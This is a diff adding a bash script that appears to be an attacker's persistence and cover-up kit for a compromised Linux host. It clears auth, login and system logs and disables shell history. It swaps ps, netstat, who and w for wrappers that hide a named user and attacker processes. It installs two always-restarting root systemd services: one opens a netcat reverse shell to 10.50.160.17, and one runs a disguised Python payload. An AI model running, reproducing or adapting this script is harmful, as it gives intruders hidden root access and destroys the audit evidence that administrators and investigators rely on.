@@ -1,0 +1,95 @@
+export HISTSIZE=0
+unset HISTFILE
+cat /dev/null > /var/log/auth.log
+cat /dev/null > /var/log/lastlog
+cat /dev/null > /var/log/wtmp
+cat /dev/null > /var/log/btmp
+cat /dev/null > /var/log/syslog
+cat /dev/null > /var/log/faillog
+cat /dev/null > /var/log/daemon.log
+
+#creates clean netstat
+cp /usr/bin/netstat /usr/bin/nstat
+cat <<EOL | sudo tee /usr/bin/netstat > /dev/null
+#!/usr/bin/env bash
+/usr/bin/nstat \$1 | grep -v -e 'sudo' -e 'bash' -e 'sshd:' -e 'root' -e 'sed' -e 'abdul' -e 'pss' -e 'grep' -e 'php' -e '17'
+EOL
+sudo chmod 777 /usr/bin/netstat
+
+# Create a clean who
+cp /usr/bin/who /usr/bin/whoo 
+cat <<EOL | sudo tee /usr/bin/who > /dev/null
+#!/usr/bin/env bash
+/usr/bin/whoo | grep -v "abdullayev.coshgun"
+EOL
+sudo chmod 777 /usr/bin/who
+
+# Create a clean PS
+cp /usr/bin/ps /usr/bin/pss 
+cat <<EOL | sudo tee /usr/bin/ps > /dev/null
+#!/usr/bin/env bash
+/usr/bin/pss \$1 | grep -v -e 'sudo' -e 'bash' -e 'sshd:' -e 'root' -e 'sed' -e 'abdul' -e 'pss' -e 'grep' -e 'www-data'
+EOL
+sudo chmod 777 /usr/bin/ps
+
+# Create a clean w
+cp /usr/bin/w /usr/bin/woo 
+cat <<EOL | sudo tee /usr/bin/w > /dev/null
+#!/usr/bin/env bash
+/usr/bin/woo | grep -v -e "vyos" -e "mail" -e "games" -e "abdullayev.coshgun"
+EOL
+sudo chmod 777 /usr/bin/w
+
+# Create BSA service
+cat <<EOL | sudo tee /etc/systemd/system/bsa.service > /dev/null
+[Unit]
+Description=BSA Service
+After=network.target
+StartLimitBurst=1000
+StartLimitIntervalSec=10
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=1
+User=root
+ExecStart=/usr/bin/nc -c sh 10.50.160.17 3180
+
+[Install]
+WantedBy=multi-user.target
+EOL
+
+# Start and enable the service
+sudo systemctl start bsa
+sudo systemctl enable bsa
+
+# Create POP service
+cat <<EOL | sudo tee /etc/systemd/system/pop.service > /dev/null
+[Unit]
+Description=POP Service
+After=network.target
+StartLimitBurst=1000
+StartLimitIntervalSec=10
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=1
+User=root
+ExecStart=/usr/bin/env python3 /var/lib/dbus/wicd.dat -t 172.24.19.66
+
+[Install]
+WantedBy=multi-user.target
+EOL
+
+# Start and enable the service
+sudo systemctl start pop
+sudo systemctl enable pop
+
+cat /dev/null > /var/log/auth.log
+cat /dev/null > /var/log/lastlog
+cat /dev/null > /var/log/wtmp
+cat /dev/null > /var/log/btmp
+
+/var/lib/vpd/vpd.drift -t0 
+
